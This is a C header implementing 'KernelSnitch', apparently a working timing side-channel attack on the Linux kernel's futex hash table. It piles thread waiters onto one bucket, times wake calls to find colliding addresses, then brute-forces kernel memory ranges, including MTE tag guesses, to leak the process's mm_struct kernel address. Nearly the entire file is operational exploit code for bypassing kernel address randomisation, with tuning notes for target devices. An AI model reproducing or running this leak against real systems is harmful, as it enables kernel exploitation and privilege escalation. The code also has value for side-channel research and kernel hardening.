#pragma once

#include "timeutils.h"
#include "utils.h"
#include "futex_hash.h"
#include "../affinity.h"

#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <limits.h>

#define FUTEX_SZ (64ULL<<30)
#define FUTEX_MMAP_SZ (1ULL<<30)
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef KS_PAGE_SIZE
#define KS_PAGE_SIZE PAGE_SIZE
#endif
#ifndef APPENDED_FUTEXES
#define APPENDED_FUTEXES 4096
#endif
#define MULTIPLE 4
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + (64ULL<<30))
#endif
#define IDENTITY_START KERNELSNITCH_IDENTITY_START
#define IDENTITY_END   KERNELSNITCH_IDENTITY_END
#define COARSE_SZ (1ULL << 30)

enum kernelsnitch_state {
    KERNELSNITCH_NOT_INIT = 0,
    KERNELSNITCH_INIT,
    KERNELSNITCH_COLLISIONS_FOUND,
    KERNELSNITCH_COLLISIONS_NOT_FOUND,
    KERNELSNITCH_MM_FOUND,
    KERNELSNITCH_MM_NOT_FOUND,
    KERNELSNITCH_LAST,
};

struct kernelsnitch_shared_state {
    volatile size_t mm_struct_sz;
    volatile size_t mm_slab_order;
    volatile size_t verbose;

    size_t collisions;
    size_t thread_cnt;
    size_t cpu_cnt;
    size_t futex_hash_table_size;
    size_t total_futexes;
    size_t appended_futexes;
    size_t repeat_measurement;
    size_t average;

    volatile unsigned char *futexes;
    volatile unsigned char inc_futex[KS_PAGE_SIZE];

    volatile size_t *futex_addrs;
    volatile size_t *times;
    volatile size_t found;
    volatile size_t mm_struct;

    pthread_t *tids;
    pthread_t *increase_tids;
    size_t increase_count;
    size_t increase_id;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    size_t identity_start;
    size_t identity_end;
#endif
    size_t identity_diff;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    size_t min_object_index;
    size_t max_object_index;
    int exact_identity_partition;
#endif

    enum kernelsnitch_state state;

    int mte_enabled;
};

#define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)

/**
 * FUTEX syscall
 */
static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
{
    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

/**
 * Do a private futex wait to increase the hash bucket of futex_hash(ks->inc_futex[id], current->mm_struct)
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.id: identifier of the futex user-space address to be used for the increase
 */
struct inc_arg {
    struct kernelsnitch_shared_state *ks;
    size_t id;
};
static void *__do_increase(void *arg)
{
    struct inc_arg *inc_arg = (struct inc_arg *)arg;
    struct kernelsnitch_shared_state *ks = inc_arg->ks;
    size_t id = inc_arg->id;
    int rc = __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0);
    if (rc != 0 && rc != -EINTR) {
        static atomic_int reported;
        if (atomic_fetch_add(&reported, 1) < 4) {
            pr_warning("waiter futex rc=%d errno=%d\n", rc, errno);
        }
    }
    free(inc_arg);
    return 0;
}

/**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the increase
 * @arg amount: increase
 */
static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
{
    ks->increase_tids = calloc(amount, sizeof(*ks->increase_tids));
    ASSERT_pr((ks->increase_tids != NULL), "failed to allocate futex waiter ids\n");
    ks->increase_count = amount;
    ks->increase_id = id;
    for (size_t i = 0; i < amount; ++i) {
        struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
        if (inc_arg == NULL) {
            /* Degrade instead of crashing: keep the waiters created so far
             * and let the caller decide whether the shallower pile-up is
             * still usable. */
            ks->increase_count = i;
            pr_warning("waiter alloc failed at %zu/%zu\n", i, amount);
            return;
        }
        inc_arg->id = id;
        inc_arg->ks = ks;
        int rc = pthread_create(&ks->increase_tids[i], 0, __do_increase,
                                (void *)inc_arg);
        if (rc != 0) {
            free(inc_arg);
            ks->increase_count = i;
            pr_warning("waiter spawn failed at %zu/%zu rc=%d "
                       "(requested=%zu actual=%zu)\n",
                       i, amount, rc, amount, ks->increase_count);
            return;
        }
    }
    WAIT();
}

static void __decrease(struct kernelsnitch_shared_state *ks)
{
    if (!ks->increase_tids)
        return;
    SYSCHK(__futex((unsigned int *)&ks->inc_futex[ks->increase_id],
                   FUTEX_WAKE_PRIVATE, INT_MAX, NULL, NULL, 0));
    for (size_t i = 0; i < ks->increase_count; ++i)
        SYSCHK(pthread_join(ks->increase_tids[i], NULL));
    free(ks->increase_tids);
    ks->increase_tids = NULL;
    ks->increase_count = 0;
}

/**
 * Simple compare
 */
#ifndef REPEAT_MEASUREMENT
#define REPEAT_MEASUREMENT 128
#endif
#ifndef AVERAGE
#define AVERAGE (1<<3)
#endif
static int __compare(const void *a, const void *b)
{
    const size_t x = *(const size_t *)a;
    const size_t y = *(const size_t *)b;
    return (x > y) - (x < y);
}

/**
 * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
 * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
 * @return averaged time of the futex wait operation
 */
static size_t __measure(
    struct kernelsnitch_shared_state *ks, size_t futex_addr)
{
    size_t t0;
    size_t t1;
    size_t time = 0;
    // do some simple signal processing and reject bad ones
    size_t __times[REPEAT_MEASUREMENT];
    for (size_t l = 0; l < ks->repeat_measurement; ++l) {
        sched_yield();
        t0 = rdtsc_begin();
        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
        t1 = rdtsc_end();
        __times[l] = t1 - t0;
    }
    qsort(__times, ks->repeat_measurement, sizeof(size_t), __compare);
    for (size_t l = 0; l < ks->average; ++l)
        time += __times[l];
    time /= ks->average;
    return time;
}

/**
 * Performs the bruteforce leak in the range [start, end]
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.range: range of the bruteforce attempt
 */
struct range {
    size_t id;
    size_t start;
    size_t end;
};
struct mm_leak_arg {
    struct kernelsnitch_shared_state *ks;
    struct range range;
};
static void *__mm_leak(void *arg)
{
    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
    struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
    struct range *range = &mm_leak_arg->range;
    if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
    size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
    for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
        if ((coarse_addr % (1ULL << 40)) == 0)
            if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
        size_t coarse_end = coarse_addr + COARSE_SZ;
        if (ks->exact_identity_partition && coarse_end > range->end)
            coarse_end = range->end;
        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_end) && !ks->found; slab_addr += mm_slab_sz) {
            size_t first_candidate =
                slab_addr + ks->min_object_index * ks->mm_struct_sz;
            size_t candidate_end =
                slab_addr + (ks->max_object_index + 1) * ks->mm_struct_sz;
            if (candidate_end > slab_addr + mm_slab_sz)
                candidate_end = slab_addr + mm_slab_sz;
            for (size_t mm_struct_candidate = first_candidate; (mm_struct_candidate < candidate_end) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
#else
        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
#endif

                size_t found_hash = 1;
                if (!ks->mte_enabled) {
                    // test the mm_struct candidate
                    for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                        found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
                    if (found_hash) {
                        ks->mm_struct = mm_struct_candidate;
                        ks->found = 1;
                        break;
                    }
                } else {
                    // need to set the tag if mte is enabled
                    for (size_t tag_candidate = 0;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
                         tag_candidate < 16 && !ks->found;
#else
                         tag_candidate < 15 && !ks->found;
#endif
                         ++tag_candidate) {
                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                        __mm_struct_candidate |= (tag_candidate << 56);
                        found_hash = 1;
                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
                        if (found_hash) {
                            if (ks->verbose)
                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
                            ks->mm_struct = __mm_struct_candidate;
                            ks->found = 1;
                            break;
                        }
                    }
                }
            }
        }
    }
    free(mm_leak_arg);
    return 0;
}

/****************************************************************************************************************/
/* EXTERNAL FUNCTIONS                                                                                           */
/****************************************************************************************************************/

/**
 * Setup phase of KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return shared KernelSnitch state
 */
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->mm_struct = -1;
    ks->mm_struct_sz = __mm_struct_sz;
    ks->mm_slab_order = __mm_slab_order;
    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
    ks->thread_cnt = __thread_cnt;
    ks->collisions = __collision_cnt;
    ks->verbose = __verbose;
    ks->mte_enabled = __mte_enabled;
    ks->appended_futexes = APPENDED_FUTEXES;
    ks->repeat_measurement = REPEAT_MEASUREMENT;
    ks->average = AVERAGE;

    // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
    ks->futex_hash_table_size = 256*ks->cpu_cnt;
    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULTIPLE;
    ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
    for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
        SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    ks->identity_start = IDENTITY_START;
    ks->identity_end = IDENTITY_END;
    ks->identity_diff =
        (ks->identity_end - ks->identity_start) / ks->thread_cnt;
    ks->min_object_index = 0;
    ks->max_object_index =
        ((KS_PAGE_SIZE << ks->mm_slab_order) / ks->mm_struct_sz) - 1;
    ks->exact_identity_partition = 0;
#else
    ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);
#endif

    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));

    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
        ks->cpu_cnt,
        ks->mm_struct_sz,
        ks->mm_slab_order,
        ks->thread_cnt,
        ks->collisions,
        ks->mte_enabled ? "enabled" : "disabled");
    pin_to_core(CORE);
    futex_init();

    ks->state = KERNELSNITCH_INIT;
    return ks;
}

void kernelsnitch_set_profile(
    struct kernelsnitch_shared_state *ks, size_t appended_futexes,
    size_t repeat_measurement, size_t average)
{
    ASSERT_pr((appended_futexes > 0), "invalid appended futex count\n");
    ASSERT_pr((repeat_measurement > 0 &&
               repeat_measurement <= REPEAT_MEASUREMENT),
              "invalid measurement count\n");
    ASSERT_pr((average > 0 && average <= repeat_measurement),
              "invalid measurement average\n");
    ks->appended_futexes = appended_futexes;
    ks->repeat_measurement = repeat_measurement;
    ks->average = average;
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
void kernelsnitch_set_search_bounds(
    struct kernelsnitch_shared_state *ks, size_t identity_start,
    size_t identity_end, size_t min_object_index, size_t max_object_index,
    int exact_identity_partition)
{
    size_t objects_per_slab =
        (KS_PAGE_SIZE << ks->mm_slab_order) / ks->mm_struct_sz;
    ASSERT_pr((identity_start < identity_end),
              "invalid KernelSnitch identity bounds\n");
    ASSERT_pr((min_object_index < objects_per_slab),
              "invalid KernelSnitch minimum object index\n");
    ASSERT_pr((min_object_index <= max_object_index &&
               max_object_index < objects_per_slab),
              "invalid KernelSnitch maximum object index\n");
    ks->identity_start = identity_start;
    ks->identity_end = identity_end;
    ks->identity_diff =
        (ks->identity_end - ks->identity_start) / ks->thread_cnt;
    ks->min_object_index = min_object_index;
    ks->max_object_index = max_object_index;
    ks->exact_identity_partition = exact_identity_partition;
}
#endif

/**
 * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
 * @arg ks: shared KernelSnitch state
 */
#ifndef KERNELSNITCH_THRESHOLD_MULT
#define KERNELSNITCH_THRESHOLD_MULT 10
#endif
#ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
#endif
/**
 * Confirmation vote for a candidate that crossed the threshold on its
 * initial sample. Re-measures KERNELSNITCH_COLLISION_CONFIRMATIONS-1
 * times and requires a MAJORITY of all samples (including the initial
 * one) to be above threshold.
 *
 * Rationale: requiring ALL confirmations to cross (upstream 0d147f4)
 * drops genuine colliders whenever a single confirmation sample catches
 * scheduler jitter — observed on f946b as every scan ending at
 * "only found N collisions" with N < wanted. A majority vote still
 * rejects pure noise: a random address would have to clear the x10
 * floor on most samples, which does not happen in practice.
 */
static int collision_confirmed(struct kernelsnitch_shared_state *ks,
                               size_t futex_addr, size_t approx_time)
{
    const size_t threshold = approx_time * KERNELSNITCH_THRESHOLD_MULT;
    size_t passes = 1; // initial sample already passed
    for (size_t confirmation = 1;
         confirmation < KERNELSNITCH_COLLISION_CONFIRMATIONS;
         ++confirmation) {
        if (__measure(ks, futex_addr) > threshold) {
            passes++;
        }
    }
    const size_t total = KERNELSNITCH_COLLISION_CONFIRMATIONS;
    return (passes * 2 > total);
}

void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
{
    #define ID 128
    size_t count = 0;
    size_t wanted;
    size_t futex_addr;
    size_t id;
    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
    wanted = ks->collisions - 1;

#ifndef KERNELSNITCH_BASELINE_SAMPLES
#define KERNELSNITCH_BASELINE_SAMPLES 8
#endif
    size_t approx_time = (size_t)-1;
    for (int __b = 0; __b < KERNELSNITCH_BASELINE_SAMPLES; ++__b) {
        size_t __s = MIN(
            __measure(ks, (size_t)&ks->futexes[0]),
            __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
        if (__s < approx_time) approx_time = __s;
    }

    // piled-up hash bucket ID 128
    // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
    __increase(ks, ID, ks->appended_futexes);
    pr_info("ksnitch pile-up waiters=%zu (wanted %zu)\n",
            ks->increase_count, ks->appended_futexes);
    {
        /* Direct read of the pile-up bucket itself. nr_wake=0 still
         * wakes one matching waiter per call on this kernel, so keep
         * the sample count tiny — this is a diagnostic, not the scan. */
        size_t pile_min = (size_t)-1, pile_max = 0;
        for (int __p = 0; __p < 8; ++__p) {
            sched_yield();
            size_t t0 = rdtsc_begin();
            __futex((unsigned int *)&ks->inc_futex[ID], FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0);
            size_t t1 = rdtsc_end();
            if (t1 - t0 < pile_min) pile_min = t1 - t0;
            if (t1 - t0 > pile_max) pile_max = t1 - t0;
        }
        pr_info("ksnitch pile-up self-measure min=%zu max=%zu (baseline %zu)\n",
                pile_min, pile_max, approx_time);
    }
    if (ks->verbose) pr_info("start finding collisions\n");

    // find futex user space address which collide with the piled-up hash bucket ID 128
    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
    // Near-miss ring: candidates that spiked on the initial sample but
    // failed the confirmation vote get one re-test after the main scan.
    // A genuine collider whose confirmation window caught a scheduler
    // burst is recovered here; a noise spike (random address passing the
    // x10 threshold AND the confirmation vote) remains vanishingly
    // unlikely, so this cannot flood the accepted set.
    size_t retry_ids[32];
    size_t retry_count = 0;
    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        futex_addr = (size_t)&ks->futexes[id];
        ks->times[i] = __measure(ks, futex_addr);
        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
            int confirmed = collision_confirmed(ks, futex_addr, approx_time);
            if (!confirmed) {
                if (retry_count < sizeof(retry_ids) / sizeof(retry_ids[0])) {
                    retry_ids[retry_count++] = id;
                }
                continue;
            }
            count++;
            ks->futex_addrs[count] = futex_addr;
            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
        }
    }
    // Second-chance pass for near misses.
    for (size_t r = 0; r < retry_count && count < wanted; ++r) {
        size_t rid = retry_ids[r];
        if (collision_confirmed(ks, (size_t)&ks->futexes[rid], approx_time)) {
            count++;
            ks->futex_addrs[count] = (size_t)&ks->futexes[rid];
            if (ks->verbose) pr_info("  %016zx (recovered on retest)\n", (size_t)&ks->futexes[rid]);
        }
    }
    if (wanted == count) {
        if (ks->verbose) pr_info("found %zd collisions\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    } else {
        pr_warning("only found %zd collisions -> cannot continue\n", count);
        if (getenv("KSNITCH_TIMING_DIAG")) {
            size_t min_t = (size_t)-1, max_t = 0, sum_t = 0, n_t = 0;
            for (size_t i = 2; i < ks->total_futexes; ++i) {
                id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
                if (id >= FUTEX_SZ) break;
                if (ks->times[i] == 0) continue;
                if (ks->times[i] < min_t) min_t = ks->times[i];
                if (ks->times[i] > max_t) max_t = ks->times[i];
                sum_t += ks->times[i];
                n_t++;
            }
            pr_warning("ksnitch timing diag approx_time=%zu threshold=%zu "
                       "min=%zu max=%zu mean=%zu n=%zu\n",
                       approx_time, approx_time * KERNELSNITCH_THRESHOLD_MULT,
                       min_t, max_t, n_t ? sum_t / n_t : 0, n_t);
        }
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
    }
    __decrease(ks);
}
size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
    return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
}

/**
 * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
    if (ks->verbose) pr_info("start bruteforcing\n");
    reset_cpu_pin();

    /* pinning-test: bias the bruteforce (timing-INsensitive, runs after
     * the calibrated scan) onto the perf cluster via uclamp instead of
     * affinity — sched_setattr carries no restricted-core EINVAL risk.
     * Spawned workers inherit the clamp at clone. Kill-switch:
     * RMG_UCLAMP=0. */
    if (!(getenv("RMG_UCLAMP") && getenv("RMG_UCLAMP")[0] == '0')) {
        struct {
            unsigned int size;
            unsigned int sched_policy;
            unsigned long long sched_flags;
            int sched_nice;
            unsigned int sched_priority;
            unsigned long long sched_runtime;
            unsigned long long sched_deadline;
            unsigned long long sched_period;
            unsigned int sched_util_min;
            unsigned int sched_util_max;
        } attr;
        memset(&attr, 0, sizeof(attr));
        attr.size = (unsigned int)sizeof(attr);
        attr.sched_policy = 0; /* SCHED_NORMAL */
        attr.sched_flags = 0x20; /* SCHED_FLAG_UTIL_CLAMP_MIN */
        attr.sched_util_min = 512;
        attr.sched_util_max = 1024;
        if (syscall(274 /* __NR_sched_setattr */, 0, &attr, 0) == 0) {
            pr_info("ksnitch bruteforce uclamp_min=512\n");
        }
    }

    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
        mm_leak_arg->ks = ks;
        mm_leak_arg->range.id = i;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
        mm_leak_arg->range.start =
            ks->identity_start + ks->identity_diff*i;
        mm_leak_arg->range.end = i + 1 == ks->thread_cnt
            ? ks->identity_end
            : ks->identity_start + ks->identity_diff*(i+1);
        if (ks->exact_identity_partition) {
            size_t slab_size = KS_PAGE_SIZE << ks->mm_slab_order;
            mm_leak_arg->range.start &= ~(slab_size - 1);
            mm_leak_arg->range.end &= ~(slab_size - 1);
            if (mm_leak_arg->range.start < ks->identity_start)
                mm_leak_arg->range.start = ks->identity_start;
            if (mm_leak_arg->range.end > ks->identity_end)
                mm_leak_arg->range.end = ks->identity_end;
        } else {
            if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
                mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
            if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
                mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
        }
#else
        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
#endif
        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
    }
    for (size_t i = 0; i < ks->thread_cnt; ++i)
        pthread_join(ks->tids[i], 0);
    ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
}

/**
 * Cleanup phase for KernelSnitch
 * @arg ks: shared KernelSnitch state
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
    munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
    ks->times = 0;
    munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
    ks->tids = 0;
    munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
    ks->futex_addrs = 0;
    munmap((void *)ks->futexes, FUTEX_SZ);
    ks->futexes = 0;
    size_t ret = ks->mm_struct;
    if (ks->verbose) pr_info("done\n");
    munmap(ks, sizeof(struct kernelsnitch_shared_state));
    return ret;
}
